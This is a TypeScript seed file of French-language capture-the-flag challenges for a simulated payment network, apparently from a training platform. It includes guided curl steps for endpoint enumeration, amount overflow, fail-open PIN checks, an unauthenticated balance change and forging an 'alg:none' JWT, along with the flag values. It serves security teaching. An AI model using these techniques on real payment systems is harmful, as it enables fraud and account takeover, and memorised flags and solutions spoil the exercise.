import type { CtfChallengeSeed } from '../ctfChallenges';

export const ISO_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'ISO-001',
        title: 'Table de Routage Exposee',
        description: 'L endpoint de debug du switch expose la table de routage BIN complete. Un attaquant en deduit la topologie du reseau, les issuers connectes et les plages de cartes actives.',
        freeModeDescription: 'Parcourez les endpoints du switch. Un endpoint de debug revele des informations topologiques sensibles.',
        category: 'ISO8583_MANIPULATION',
        difficulty: 'BEGINNER',
        points: 100,
        flagValue: 'PMP{BIN_TABLE_EXPOSED}',
        targetService: 'sim-network-switch',
        targetEndpoint: 'GET http://sim-network-switch:8004/transaction/bin-table',
        vulnerabilityType: 'Information disclosure',
        attackVector: 'Debug endpoint enumeration',
        learningObjectives: ['Decouvrir les endpoints debug d un switch', 'Comprendre la sensibilite de la table BIN', 'Evaluer le risque de fuite topologique'],
        estimatedMinutes: 15,
        isActive: true,
        relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Enumeration des endpoints switch', stepDescription: 'Le switch expose des routes REST. Testez les endpoints courants pour trouver les routes de debug.', stepType: 'CURL_COMMAND', commandTemplate: 'for path in status config bin-table routes debug health metrics; do echo -n "/transaction/$path: "; curl -s -o /dev/null -w "%{http_code}" http://sim-network-switch:8004/transaction/$path; echo; done', expectedOutput: '200 sur /transaction/bin-table — endpoint de debug accessible' },
            { stepNumber: 2, stepTitle: 'Extraction de la table BIN', stepDescription: 'Recuperez la table de routage BIN complete.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://sim-network-switch:8004/transaction/bin-table | jq .', expectedOutput: 'Liste des BINs avec issuer, pays, type de carte, et routage' },
            { stepNumber: 3, stepTitle: 'Analyse topologique', stepDescription: 'La table BIN revele : quels issuers sont connectes, quels pays, quels types de cartes. C est une carte du reseau de paiement.', stepType: 'ANALYSIS', hintText: 'Un attaquant peut cibler les BINs les plus riches ou les moins proteges.' },
            { stepNumber: 4, stepTitle: 'Utilisation offensive', stepDescription: 'Avec la table BIN, l attaquant sait quels PAN sont valides, quels issuers ont des limites elevees, et peut cibler ses attaques.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Capture du flag', stepDescription: 'La table BIN est exposee sans authentification.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Testez GET sur /transaction/bin-table. C est un endpoint de debug.', costPoints: 5 },
            { hintNumber: 2, hintText: 'La table BIN revele la topologie complete du reseau de paiement.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'ISO-002',
        title: 'Montant Maximum',
        description: 'La validation du montant dans le switch autorise des valeurs astronomiques. Un attaquant peut envoyer une transaction de 999 999 999.99 EUR car la limite technique est deconnectee de la realite metier.',
        freeModeDescription: 'Testez les limites du champ montant. Le switch accepte des valeurs bien au-dela de toute realite business.',
        category: 'ISO8583_MANIPULATION',
        difficulty: 'INTERMEDIATE',
        points: 150,
        flagValue: 'PMP{ISO_AMOUNT_OVERFLOW}',
        prerequisiteChallengeCode: 'ISO-001',
        targetService: 'sim-network-switch',
        targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'Missing business validation',
        attackVector: 'Amount manipulation',
        learningObjectives: ['Identifier les limites techniques vs business', 'Comprendre la validation multicouche', 'Proposer des hard caps par segment'],
        estimatedMinutes: 20,
        isActive: true,
        relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Transaction normale', stepDescription: 'Envoyez une transaction standard pour verifier le flux.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":50,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq .responseCode', expectedOutput: '00 — approuvee' },
            { stepNumber: 2, stepTitle: 'Test des limites', stepDescription: 'Augmentez progressivement pour trouver la limite.', stepType: 'CURL_COMMAND', commandTemplate: 'for amt in 10000 100000 1000000 999999999; do echo -n "Amount $amt: "; curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":$amt,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq -r .responseCode; done', expectedOutput: 'Tout passe — pas de hard cap business' },
            { stepNumber: 3, stepTitle: 'Transaction astronomique', stepDescription: 'Envoyez 999 999 999.99 EUR. Si ca passe, la validation est inexistante.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":999999999.99,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq .', expectedOutput: 'Approuvee ! Pas de limite business.' },
            { stepNumber: 4, stepTitle: 'Impact', stepDescription: 'Un fraudeur peut debiter un milliard d euros en une seule transaction. Il manque des limites par MCC, par merchant, et par porteur.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Capture du flag', stepDescription: 'Overflow de montant ISO 8583.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Testez des montants de plus en plus grands. Il n y a pas de limite business.', costPoints: 5 },
            { hintNumber: 2, hintText: '999999999.99 est approuve. La validation technique ne reflete pas les limites metier.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];

export const PIN_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'PIN-001',
        title: 'Le Fallback Silencieux',
        description: 'Quand le HSM est indisponible, la verification PIN bascule en mode fail-open et approuve tous les PIN, meme invalides.',
        freeModeDescription: 'Provoquez une indisponibilite du HSM et observez le comportement de la verification PIN. Fail-closed ou fail-open ?',
        category: 'PIN_CRACKING',
        difficulty: 'ADVANCED',
        points: 250,
        flagValue: 'PMP{PIN_VERIFY_FAILOPEN}',
        targetService: 'sim-auth-engine',
        targetEndpoint: 'POST http://hsm-simulator:8011/pin/verify',
        vulnerabilityType: 'Fail-open pin verification',
        attackVector: 'HSM unavailability exploitation',
        learningObjectives: ['Comprendre le cycle de verification PIN', 'Identifier le comportement fail-open', 'Concevoir une politique fail-closed pour PIN'],
        estimatedMinutes: 30,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Verification PIN normale', stepDescription: 'Envoyez un PIN correct pour observer la verification standard.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/pin/verify -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"pinBlock\\":\\"0412AC789012\\",\\"zpkLabel\\":\\"ZPK_001\\"}" | jq .', expectedOutput: 'verified: true — PIN valide via HSM' },
            { stepNumber: 2, stepTitle: 'PIN invalide', stepDescription: 'Envoyez un PIN incorrect pour confirmer que la verification fonctionne.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/pin/verify -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"pinBlock\\":\\"0400000000000\\",\\"zpkLabel\\":\\"ZPK_001\\"}" | jq .', expectedOutput: 'verified: false — PIN invalide refuse' },
            { stepNumber: 3, stepTitle: 'Simulation panne HSM', stepDescription: 'Provoquez une indisponibilite du HSM et retestez la verification PIN.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/hsm/config -H "Content-Type: application/json" -d "{\\"simulateDown\\":true}" && curl -s -X POST http://hsm-simulator:8011/pin/verify -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"pinBlock\\":\\"0400000000000\\",\\"zpkLabel\\":\\"ZPK_001\\"}" | jq .', expectedOutput: 'verified: true MALGRE pin invalide — fail-open !' },
            { stepNumber: 4, stepTitle: 'Exploitation en masse', stepDescription: 'Pendant la panne, TOUS les PIN sont approuves. Un attaquant peut retirer de l argent avec n importe quel code PIN.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Restauration', stepDescription: 'Reactivez le HSM et verifiez que la verification redevient normale.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/hsm/config -H "Content-Type: application/json" -d "{\\"simulateDown\\":false}"' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'PIN verification en mode fail-open.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Quand le HSM est en panne, comment le service gere-t-il les verifications PIN ? Fail-closed (refuse) ou fail-open (approuve) ?', costPoints: 5 },
            { hintNumber: 2, hintText: 'Activez simulateDown sur le HSM. Puis envoyez un PIN invalide. Il est quand meme approuve.', costPoints: 15 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'PIN-002',
        title: 'Random Previsible',
        description: 'Le padding du PIN block utilise Math.random() au lieu d un CSPRNG. Le padding est previsible et le PIN block peut etre reconstruit.',
        freeModeDescription: 'Analysez le code de generation du PIN block. Le PRNG utilise est-il cryptographiquement securise ?',
        category: 'PIN_CRACKING',
        difficulty: 'EXPERT',
        points: 300,
        flagValue: 'PMP{MATH_RANDOM_PIN_BLOCK}',
        prerequisiteChallengeCode: 'PIN-001',
        targetService: 'sim-auth-engine',
        targetEndpoint: 'Code source du generateur PIN block',
        vulnerabilityType: 'Weak PRNG',
        attackVector: 'Source code analysis',
        learningObjectives: ['Distinguer PRNG vs CSPRNG', 'Comprendre pourquoi Math.random() est dangereux en crypto', 'Identifier l impact sur les PIN blocks ISO 9564'],
        estimatedMinutes: 35,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Observation blackbox du generateur', stepDescription: 'Generez une serie de PIN blocks pour observer le comportement du padding sans lire le code source.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in $(seq 1 10); do curl -s -X POST http://hsm-simulator:8011/pin/generate-block -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"pin\\":\\"1234\\"}" | jq -r .pinBlock; done', expectedOutput: 'Serie de PIN blocks permettant d analyser la variabilite du padding' },
            { stepNumber: 2, stepTitle: 'Analyse du PRNG', stepDescription: 'Math.random() utilise xorshift128+ qui est deterministe et previsible. Un attaquant qui observe quelques sorties peut predire les suivantes.', stepType: 'ANALYSIS', hintText: 'Math.random() n est PAS un generateur cryptographique. Il est concu pour la performance, pas la securite.' },
            { stepNumber: 3, stepTitle: 'Generation de PIN blocks', stepDescription: 'Generez plusieurs PIN blocks et observez les patterns dans le padding.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in $(seq 1 10); do curl -s -X POST http://hsm-simulator:8011/pin/generate-block -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"pin\\":\\"1234\\"}" | jq -r .pinBlock; done', expectedOutput: 'PIN blocks avec padding previsible' },
            { stepNumber: 4, stepTitle: 'Previsibilite du padding', stepDescription: 'Comparez les octets de padding entre les PIN blocks generes. Un CSPRNG produirait des paddings totalement independants. Ici, les correlations sont detectables.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Impact : recovery du PIN', stepDescription: 'Si le padding est previsible et qu on connait le PAN, on peut reconstituer le PIN a partir du PIN block par XOR.', stepType: 'EXPLANATION' },
            { stepNumber: 6, stepTitle: 'Remediation', stepDescription: 'Remplacer Math.random() par crypto.randomBytes(). Ajouter une regle ESLint interdisant Math.random dans les modules crypto.', stepType: 'EXPLANATION' },
            { stepNumber: 7, stepTitle: 'Capture du flag', stepDescription: 'Math.random utilise pour le PIN block.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Generez plusieurs PIN blocks consecutifs et comparez les suffixes pour detecter un PRNG faible.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Math.random() est utilise pour generer le padding du PIN block ISO 9564. C est un PRNG previsible.', costPoints: 15 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];

export const MITM_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'MITM-001',
        title: 'Le CVV Voyageur',
        description: 'Le CVV transite en clair dans les payloads inter-services apres la decision d autorisation. C est une violation PCI DSS Exigence 3.2.',
        freeModeDescription: 'Interceptez le trafic entre les services. Le CVV transite en clair dans des payloads ou il ne devrait plus etre present.',
        category: 'MITM',
        difficulty: 'INTERMEDIATE',
        points: 200,
        flagValue: 'PMP{CVV_CLEARTEXT_LEAK}',
        targetService: 'sim-network-switch',
        targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize (inter-service)',
        vulnerabilityType: 'SAD retention',
        attackVector: 'Inter-service traffic interception',
        learningObjectives: ['Comprendre les exigences PCI DSS sur les SAD', 'Detecter une fuite CVV post-autorisation', 'Proposer un masquage et une suppression correcte'],
        estimatedMinutes: 25,
        isActive: true,
        relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Envoi d une transaction avec CVV', stepDescription: 'Envoyez une autorisation avec un CVV et observez la reponse complete.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"cvv\\":\\"123\\",\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq .', expectedOutput: 'Reponse contenant potentiellement le CVV en clair' },
            { stepNumber: 2, stepTitle: 'Inspection de la reponse', stepDescription: 'Cherchez le champ CVV dans la reponse. Apres autorisation, le CVV ne devrait JAMAIS etre retourne ou stocke.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"cvv\\":\\"123\\",\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq ".. | .cvv? // empty"', hintText: 'Cherchez le champ cvv dans tous les niveaux du JSON.' },
            { stepNumber: 3, stepTitle: 'Capture dans les logs', stepDescription: 'Verifiez si le CVV apparait dans les logs du switch.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://sim-network-switch:8004/transaction/recent-logs | jq ".[0:5]" | grep -i cvv' },
            { stepNumber: 4, stepTitle: 'PCI DSS Exigence 3.2', stepDescription: 'PCI DSS interdit formellement de stocker les SAD (CVV, CVC, PIN) apres autorisation. Le CVV doit etre supprime immediatement apres la decision.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Impact', stepDescription: 'Un attaquant sur le reseau interne peut intercepter les CVV et les utiliser pour des transactions CNP frauduleuses.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Le CVV transite en clair.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Envoyez une transaction avec un CVV et examinez attentivement tous les champs de la reponse.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Le CVV est retourne dans la reponse et/ou visible dans les logs. PCI DSS Exigence 3.2 correspond a l interdiction.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];

export const PRIVESC_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'PRIV-001',
        title: 'Le Compte en Banque Infini',
        description: 'Un endpoint de modification de solde est accessible sans authentification. Un etudiant peut crediter n importe quel compte de montants arbitraires.',
        freeModeDescription: 'Cherchez les endpoints de gestion des comptes. L un d eux permet de modifier le solde sans autorisation.',
        category: 'PRIVILEGE_ESCALATION',
        difficulty: 'ADVANCED',
        points: 300,
        flagValue: 'PMP{BALANCE_UPDATE_NO_AUTH}',
        targetService: 'sim-issuer-service',
        targetEndpoint: 'PUT http://sim-issuer-service:8005/accounts/:id/balance',
        vulnerabilityType: 'Broken access control',
        attackVector: 'Direct object manipulation',
        learningObjectives: ['Identifier un endpoint critique non protege', 'Comprendre les IDOR', 'Evaluer l impact d une modification de solde non autorisee'],
        estimatedMinutes: 25,
        isActive: true,
        relatedWorkshopPath: '/student/theory/intro',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Enumeration des comptes', stepDescription: 'Cherchez les endpoints de l issuer service pour lister les comptes.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://sim-issuer-service:8005/accounts | jq .[0:3]', expectedOutput: 'Liste des comptes avec ids et soldes' },
            { stepNumber: 2, stepTitle: 'Lecture d un solde', stepDescription: 'Recuperez le solde d un compte specifique.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://sim-issuer-service:8005/accounts/ACC001 | jq "{id, balance}"', expectedOutput: 'Un solde de depart normal' },
            { stepNumber: 3, stepTitle: 'Modification sans auth', stepDescription: 'Tentez de modifier le solde sans token d authentification.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X PUT http://sim-issuer-service:8005/accounts/ACC001/balance -H "Content-Type: application/json" -d "{\\"balance\\":999999999}" | jq .', expectedOutput: 'Succes ! Solde modifie a 999999999 sans authentification' },
            { stepNumber: 4, stepTitle: 'Verification du credit', stepDescription: 'Verifiez que le solde a bien ete modifie.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://sim-issuer-service:8005/accounts/ACC001 | jq .balance', expectedOutput: '999999999 — credit illimite' },
            { stepNumber: 5, stepTitle: 'Impact', stepDescription: 'N importe qui peut crediter n importe quel compte sans limite. C est une faille critique de controle d acces.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Modification de solde sans authentification.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Cherchez un endpoint PUT ou PATCH sur /accounts/:id/balance.', costPoints: 5 },
            { hintNumber: 2, hintText: 'L endpoint accepte le body {"balance": valeur} sans aucun token ou cookie d authentification.', costPoints: 15 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];

export const CRYPTO_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'CRYPTO-001',
        title: 'Token Predictible',
        description: 'Les tokens de session sont generes avec un algorithme previsible. En observant quelques tokens, un attaquant peut predire les suivants et usurper des sessions.',
        freeModeDescription: 'Generez plusieurs tokens de session. Detectez le pattern dans la generation et predisez le prochain token.',
        category: 'CRYPTO_WEAKNESS',
        difficulty: 'BEGINNER',
        points: 120,
        flagValue: 'PMP{TOKEN_PREDICTABLE_PRNG}',
        targetService: 'api-gateway',
        targetEndpoint: 'POST http://api-gateway:8000/auth/session-token',
        vulnerabilityType: 'Weak token generation',
        attackVector: 'Pattern analysis',
        learningObjectives: ['Identifier un algorithme de generation faible', 'Exploiter la previsibilite des tokens', 'Comprendre l importance d un CSPRNG'],
        estimatedMinutes: 20,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Collecte de tokens', stepDescription: 'Generez 10 tokens consecutifs et observez leur structure.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in $(seq 1 10); do curl -s -X POST http://api-gateway:8000/auth/session-token | jq -r .token; done', expectedOutput: 'Tokens avec un pattern visible (timestamp + compteur ou hash incremental)' },
            { stepNumber: 2, stepTitle: 'Detection du pattern', stepDescription: 'Comparez les tokens. Y a-t-il un prefixe commun, un compteur, ou un hash faible ?', stepType: 'ANALYSIS', hintText: 'Regardez si les derniers caracteres s incrementent ou si une partie est un timestamp.' },
            { stepNumber: 3, stepTitle: 'Prediction', stepDescription: 'Predisez le prochain token et testez votre prediction.', stepType: 'EXPLOITATION', hintText: 'Si le token est base64(timestamp+counter), incrementez le counter.' },
            { stepNumber: 4, stepTitle: 'Impact : session hijacking', stepDescription: 'Un attaquant qui predit des tokens peut usurper les sessions d autres utilisateurs sans connaitre leurs credentials.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Capture du flag', stepDescription: 'Tokens generees par PRNG previsible.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Generez plusieurs tokens rapidement et comparez-les. Le pattern est visible.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Les tokens sont bases sur un compteur ou timestamp, pas un CSPRNG. Ils sont previsibles.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'CRYPTO-002',
        title: 'Auth Code Guessable',
        description: 'Les codes d autorisation transactionnels sont generes par un PRNG faible. Avec quelques observations, un attaquant peut predire les futurs auth codes.',
        freeModeDescription: 'Collectez des auth codes de transactions successives. Detectez la logique de generation et predisez les prochains.',
        category: 'CRYPTO_WEAKNESS',
        difficulty: 'ADVANCED',
        points: 220,
        flagValue: 'PMP{AUTHCODE_WEAK_PRNG}',
        prerequisiteChallengeCode: 'CRYPTO-001',
        targetService: 'sim-auth-engine',
        targetEndpoint: 'POST http://sim-auth-engine:8006/auth/generate-code',
        vulnerabilityType: 'Weak auth code generation',
        attackVector: 'Sequence prediction',
        learningObjectives: ['Analyser la generation de codes d autorisation', 'Exploiter un PRNG faible', 'Comprendre le risque de codes previsibles pour les reversals'],
        estimatedMinutes: 30,
        isActive: true,
        relatedWorkshopPath: '/student/theory/intro',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Collecte d auth codes', stepDescription: 'Generez 20 transactions pour collecter les codes d autorisation.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in $(seq 1 20); do curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":$((i*10)),\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq -r .authCode; done', expectedOutput: 'Sequence d auth codes avec pattern detectable' },
            { stepNumber: 2, stepTitle: 'Analyse de la sequence', stepDescription: 'Les auth codes sont-ils incrementaux, bases sur un hash faible, ou sur un timestamp ?', stepType: 'ANALYSIS', hintText: 'Convertissez-les en nombres et cherchez une progression arithmetique ou un modulo.' },
            { stepNumber: 3, stepTitle: 'Prediction et verification', stepDescription: 'Predisez le prochain auth code et verifiez.', stepType: 'EXPLOITATION' },
            { stepNumber: 4, stepTitle: 'Impact : faux reversal', stepDescription: 'Un attaquant qui predit les auth codes peut forger des messages de reversal (0420) pour annuler des transactions legitimes et recuperer l argent.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Capture du flag', stepDescription: 'Auth code genere par PRNG faible.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Generez 20+ auth codes et analysez la sequence. Cherchez des patterns incrementaux.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Les codes suivent une logique previsible (compteur, timestamp, ou hash sequentiel). Un CSPRNG produirait des codes independants.', costPoints: 15 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];

export const INFRA_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'INFRA-005',
        title: 'L\'Algorithme Fantôme',
        description: 'Le serveur d\'autorisation accepte des JWT signés avec l\'algorithme "none". Un attaquant peut forger un token valide avec n\'importe quel payload sans connaître le secret de signature.',
        freeModeDescription: 'Décodez le JWT retourné par l\'API. Modifiez son payload (rôle admin, user ID différent), changez l\'algorithme en "none", supprimez la signature, et soumettez-le.',
        category: 'CRYPTO_WEAKNESS',
        difficulty: 'INTERMEDIATE',
        points: 200,
        flagValue: 'PMP{JWT_NONE_ALGO_BYPASS}',
        prerequisiteChallengeCode: 'CRYPTO-001',
        targetService: 'api-gateway',
        targetEndpoint: 'POST http://api-gateway:8000/auth/login (puis endpoints protégés)',
        vulnerabilityType: 'JWT None Algorithm accepted',
        attackVector: 'Algorithm confusion attack',
        learningObjectives: [
            'Comprendre la structure d\'un JWT (header.payload.signature)',
            'Identifier la vulnérabilité "alg:none" dans les bibliothèques JWT',
            'Forger un token sans secret de signature',
            'Implémenter une whitelist d\'algorithmes côté serveur',
        ],
        estimatedMinutes: 25,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        guidedSteps: [
            {
                stepNumber: 1,
                stepTitle: 'Obtenir un JWT valide',
                stepDescription: 'Connectez-vous avec des credentials standards pour obtenir un JWT. Décodez-le en Base64 pour observer sa structure.',
                stepType: 'CURL_COMMAND',
                commandTemplate: 'TOKEN=$(curl -s -X POST http://api-gateway:8000/auth/login -H "Content-Type: application/json" -d \'{"email":"student@test.com","password":"student123"}\' | jq -r .token) && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .',
                expectedOutput: 'Header: {"alg":"HS256","typ":"JWT"} — Payload avec userId, role, iat, exp',
            },
            {
                stepNumber: 2,
                stepTitle: 'Comprendre la structure JWT',
                stepDescription: 'Un JWT = header.payload.signature. Tout est en Base64url. La signature valide l\'intégrité. Sans la clé secrète, on ne peut pas modifier le payload ET garder une signature valide... sauf si l\'algorithme "none" est accepté.',
                stepType: 'ANALYSIS',
                hintText: 'L\'algorithme "none" indique "pas de signature". Si le serveur l\'accepte, n\'importe qui peut forger un token.',
            },
            {
                stepNumber: 3,
                stepTitle: 'Forger un token avec alg:none',
                stepDescription: 'Construisez un JWT forgé : header avec alg:none, payload avec role:admin, signature vide. En Base64url puis assemblez.',
                stepType: 'CURL_COMMAND',
                commandTemplate: 'HEADER=$(echo -n \'{"alg":"none","typ":"JWT"}\' | base64 -w0 | tr \'+/\' \'-_\' | tr -d \'=\') && PAYLOAD=$(echo -n \'{"userId":"admin-000","email":"admin@bank.com","role":"FORMATEUR","iat":9999999999,"exp":9999999999}\' | base64 -w0 | tr \'+/\' \'-_\' | tr -d \'=\') && FORGED_TOKEN="$HEADER.$PAYLOAD." && echo "Forged JWT: $FORGED_TOKEN"',
                expectedOutput: 'Un JWT de la forme xxxxx.yyyyy. (signature vide)',
            },
            {
                stepNumber: 4,
                stepTitle: 'Tester le token forgé',
                stepDescription: 'Utilisez le token forgé pour accéder à un endpoint protégé réservé aux admins/formateurs.',
                stepType: 'CURL_COMMAND',
                commandTemplate: 'HEADER=$(echo -n \'{"alg":"none","typ":"JWT"}\' | base64 -w0 | tr \'+/\' \'-_\' | tr -d \'=\') && PAYLOAD=$(echo -n \'{"userId":"admin-000","email":"admin@bank.com","role":"FORMATEUR","iat":9999999999,"exp":9999999999}\' | base64 -w0 | tr \'+/\' \'-_\' | tr -d \'=\') && FORGED_TOKEN="$HEADER.$PAYLOAD." && curl -s -H "Authorization: Bearer $FORGED_TOKEN" http://api-gateway:8000/api/cursus | jq .[] | head -5',
                expectedOutput: 'Si la réponse retourne des données (pas 401) — le serveur accepte alg:none → vulnérabilité confirmée',
            },
            {
                stepNumber: 5,
                stepTitle: 'Escalade vers admin',
                stepDescription: 'Modifiez le payload pour usurper un compte admin et accéder aux endpoints d\'administration réservés aux formateurs.',
                stepType: 'EXPLOITATION',
                hintText: 'Changez role en "FORMATEUR" ou "ADMIN" dans le payload. La signature vide passe si le serveur est vulnérable.',
            },
            {
                stepNumber: 6,
                stepTitle: 'Capture du flag',
                stepDescription: 'L\'endpoint /api/ctf/admin/challenges (ou équivalent) retourne le flag quand accédé avec un token forgé en rôle FORMATEUR.',
                stepType: 'EXPLOITATION',
            },
        ],
        hints: [
            {
                hintNumber: 1,
                hintText: 'Un JWT est composé de 3 parties séparées par des points. Encodez chaque partie en Base64url (pas Base64 standard).',
                costPoints: 5,
            },
            {
                hintNumber: 2,
                hintText: 'Base64url ≠ Base64 : remplacez + par -, / par _, et supprimez les = de padding. La signature d\'un token alg:none est une chaîne vide.',
                costPoints: 15,
            },
            {
                hintNumber: 3,
                hintText: 'Le token forgé ressemble à : BASE64URL({"alg":"none"}).BASE64URL({"role":"FORMATEUR",...}). (point final, signature vide). Testez sur /api/cursus pour vérifier l\'acceptation.',
                costPoints: 25,
            },
        ],
    },
];
